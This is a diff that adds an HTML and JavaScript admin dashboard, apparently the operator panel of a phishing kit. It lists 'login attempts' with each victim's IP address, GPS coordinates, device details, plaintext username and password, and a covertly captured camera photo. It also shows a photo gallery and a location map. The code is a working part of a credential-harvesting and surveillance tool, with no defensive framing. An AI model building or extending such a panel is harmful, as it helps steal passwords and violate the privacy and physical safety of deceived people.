@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="/admin.css">
+</head>
+
+<body>
+    <div class="dashboard">
+        <!-- Header -->
+        <header class="header">
+            <h1>📊 Admin Dashboard</h1>
+            <div class="header-actions">
+                <span class="admin-badge">Admin</span>
+                <a href="/admin-logout" class="logout-btn">Logout</a>
+            </div>
+        </header>
+
+        <!-- Stats Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon">📋</div>
+                <div class="stat-content">
+                    <h3 id="total-attempts">0</h3>
+                    <p>Total Attempts</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">📸</div>
+                <div class="stat-content">
+                    <h3 id="total-photos">0</h3>
+                    <p>Photos Captured</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🌍</div>
+                <div class="stat-content">
+                    <h3 id="total-locations">0</h3>
+                    <p>Locations</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🕐</div>
+                <div class="stat-content">
+                    <h3 id="latest-time">-</h3>
+                    <p>Latest Attempt</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Login Attempts Table -->
+        <div class="section">
+            <div class="section-header">
+                <h2>📋 Recent Login Attempts</h2>
+                <button onclick="refreshData()" class="refresh-btn">🔄 Refresh</button>
+            </div>
+            <div class="table-container">
+                <table id="attempts-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>IP Address</th>
+                            <th>Location</th>
+                            <th>Device</th>
+                            <th>Credentials</th>
+                            <th>Photo</th>
+                        </tr>
+                    </thead>
+                    <tbody id="attempts-tbody">
+                        <tr>
+                            <td colspan="6" style="text-align: center; padding: 40px; color: #888;">
+                                Loading data...
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Photo Gallery -->
+        <div class="section">
+            <div class="section-header">
+                <h2>📸 Captured Photos</h2>
+                <button onclick="downloadAllPhotos()" class="download-btn">⬇️ Download All</button>
+            </div>
+            <div class="photo-gallery" id="photo-gallery">
+                <p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>
+            </div>
+        </div>
+
+        <!-- Location Map -->
+        <div class="section">
+            <div class="section-header">
+                <h2>🗺️ Location Map</h2>
+            </div>
+            <div id="map-container" class="map-container">
+                <iframe id="location-map" width="100%" height="500" frameborder="0"
+                    style="border:0; border-radius: 8px;" allowfullscreen></iframe>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lightbox for photos -->
+    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+        <span class="lightbox-close">&times;</span>
+        <img id="lightbox-img" src="" alt="Photo">
+        <div id="lightbox-caption"></div>
+    </div>
+
+    <script>
+        let attemptsData = [];
+
+        // Load data on page load
+        window.addEventListener('load', () => {
+            loadData();
+        });
+
+        async function loadData() {
+            try {
+                const response = await fetch('/admin/api/data');
+                const data = await response.json();
+                attemptsData = data.attempts || [];
+
+                updateStats(data);
+                renderAttemptsTable(attemptsData);
+                renderPhotoGallery(data.photos || []);
+                updateMap(attemptsData);
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        function updateStats(data) {
+            document.getElementById('total-attempts').textContent = data.attempts.length;
+            document.getElementById('total-photos').textContent = data.photos.length;
+
+            const uniqueLocations = new Set(
+                data.attempts
+                    .filter(a => a.gpsLocation && a.gpsLocation.latitude)
+                    .map(a => `${a.gpsLocation.latitude},${a.gpsLocation.longitude}`)
+            ).size;
+            document.getElementById('total-locations').textContent = uniqueLocations;
+
+            if (data.attempts.length > 0) {
+                const latest = new Date(data.attempts[0].timestamp);
+                document.getElementById('latest-time').textContent = formatRelativeTime(latest);
+            }
+        }
+
+        function renderAttemptsTable(attempts) {
+            const tbody = document.getElementById('attempts-tbody');
+
+            if (attempts.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 40px; color: #888;">No login attempts yet</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = attempts.map((attempt, index) => {
+                const time = new Date(attempt.timestamp).toLocaleString();
+                const location = getLocationString(attempt);
+                const device = getDeviceString(attempt);
+                const photoFilename = getPhotoFilename(attempt.timestamp, attempt.ip);
+
+                return `
+                    <tr>
+                        <td>${time}</td>
+                        <td><code>${attempt.ip}</code></td>
+                        <td>${location}</td>
+                        <td>${device}</td>
+                        <td>
+                            <strong>U:</strong> ${attempt.username}<br>
+                            <strong>P:</strong> ${attempt.password}
+                        </td>
+                        <td>
+                            ${attempt.photoData ?
+                        `<button onclick="viewPhoto('${photoFilename}')" class="view-photo-btn">📷 View</button>` :
+                        '<span style="color: #999;">No photo</span>'}
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        function renderPhotoGallery(photos) {
+            const gallery = document.getElementById('photo-gallery');
+
+            if (photos.length === 0) {
+                gallery.innerHTML = '<p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>';
+                return;
+            }
+
+            gallery.innerHTML = photos.map(photo => `
+                <div class="photo-item" onclick="viewPhoto('${photo.filename}')">
+                    <img src="/admin/photo/${photo.filename}" alt="Captured photo">
+                    <div class="photo-overlay">
+                        <p>${photo.filename}</p>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function updateMap(attempts) {
+            const validLocations = attempts.filter(a =>
+                a.gpsLocation && a.gpsLocation.latitude && a.gpsLocation.longitude
+            );
+
+            if (validLocations.length === 0) {
+                document.getElementById('map-container').innerHTML =
+                    '<p style="text-align: center; padding: 40px; color: #888;">No GPS locations captured yet</p>';
+                return;
+            }
+
+            // Use first location as map center
+            const center = validLocations[0].gpsLocation;
+            const markers = validLocations.map((a, i) =>
+                `markers=color:red%7Clabel:${i + 1}%7C${a.gpsLocation.latitude},${a.gpsLocation.longitude}`
+            ).join('&');
+
+            const mapUrl = `https://maps.google.com/maps?q=${center.latitude},${center.longitude}&z=10&output=embed`;
+            document.getElementById('location-map').src = mapUrl;
+        }
+
+        function getLocationString(attempt) {
+            if (attempt.gpsLocation && attempt.gpsLocation.latitude) {
+                return `📍 ${attempt.gpsLocation.latitude.toFixed(4)}, ${attempt.gpsLocation.longitude.toFixed(4)}<br>
+                        <small>±${Math.round(attempt.gpsLocation.accuracy || 0)}m</small>`;
+            }
+            if (attempt.geo && attempt.geo.city) {
+                return `🌐 ${attempt.geo.city}, ${attempt.geo.country}`;
+            }
+            return '<span style="color: #999;">Unknown</span>';
+        }
+
+        function getDeviceString(attempt) {
+            if (!attempt.deviceDetails) return '<span style="color: #999;">Unknown</span>';
+            const d = attempt.deviceDetails;
+            return `${d.platform || 'Unknown'}<br><small>${d.screenResolution || 'Unknown'}</small>`;
+        }
+
+        function getPhotoFilename(timestamp, ip) {
+            const date = new Date(timestamp).toISOString().replace(/:/g, '-');
+            const cleanIp = ip.replace(/[.:]/g, '-');
+            return `${date}_${cleanIp}.jpg`;
+        }
+
+        function viewPhoto(filename) {
+            const lightbox = document.getElementById('lightbox');
+            const img = document.getElementById('lightbox-img');
+            const caption = document.getElementById('lightbox-caption');
+
+            img.src = `/admin/photo/${filename}`;
+            caption.textContent = filename;
+            lightbox.style.display = 'flex';
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').style.display = 'none';
+        }
+
+        function refreshData() {
+            loadData();
+        }
+
+        function downloadAllPhotos() {
+            alert('Download all photos functionality - would create a ZIP file of all photos');
+        }
+
+        function formatRelativeTime(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            if (seconds < 60) return `${seconds}s ago`;
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes}m ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours}h ago`;
+            const days = Math.floor(hours / 24);
+            return `${days}d ago`;
+        }
+
+        // Close lightbox on Escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeLightbox();
+        });
+    </script>
+</body>
+
+</html>
